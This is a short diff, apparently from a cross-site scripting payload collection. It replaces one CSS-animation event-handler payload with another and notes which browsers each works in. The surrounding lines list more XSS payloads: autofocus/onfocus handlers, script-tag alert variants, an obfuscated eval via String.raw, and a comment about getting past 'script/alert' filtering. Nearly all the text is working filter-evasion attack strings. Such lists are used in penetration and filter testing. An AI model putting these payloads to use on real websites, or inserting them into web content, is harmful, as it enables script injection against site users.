@@ -50,8 +50,7 @@ autofocus onfocus=window.onerror=alert;throw/1/;//
 <script> $=1, alert($) </script>
 <script> (alert) (1) </script>
 <script> eval(String.raw({[`raw`]:`aet(1)`},...`lr`)) </script>
-<style>@keyframes x{</style><div style=animation-name:x onanimationstart=alert(1)>} //Chrome only
-
+<xss onanimationend=alert(1337)><style>*{animation-name:n}@keyframes n{} //Not FF
                                                        
  
 /*Bypass filtration "script/alert"*/
